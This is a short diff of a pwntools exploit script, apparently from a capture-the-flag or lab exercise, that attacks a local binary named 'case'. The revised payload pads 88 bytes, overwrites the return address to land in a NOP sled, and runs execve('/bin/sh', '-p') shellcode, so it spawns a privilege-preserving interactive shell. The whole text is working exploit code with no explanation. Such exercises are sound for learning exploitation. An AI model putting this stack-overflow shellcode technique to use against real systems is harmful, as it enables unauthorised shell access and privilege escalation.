@@ -3,17 +3,19 @@ from pwn import *
 context.arch = 'amd64'
 context.os   = 'linux'
 
-shellcode = asm(shellcraft.sh())
-assert b'\n' not in shellcode
+addr = 0x7fffffffecf8
 
-buf_addr = 0x7fffffffe210
-offset   = 88
+offset = 88
+ret = addr + offset
 
-payload  = shellcode
-payload += b'A' * (offset - len(shellcode))
-payload += p64(buf_addr)
+shellcode = asm(shellcraft.execve('/bin/sh', ['/bin/sh', '-p'], 0))
 
-p = process('./case')
+payload  = b'A' * offset
+payload += p64(ret)
+payload += b'\x90' * 100
+payload += shellcode
+
+p = process(['env', '-i', './case'])
 sleep(0.5)
 p.sendline(payload)
 p.interactive()
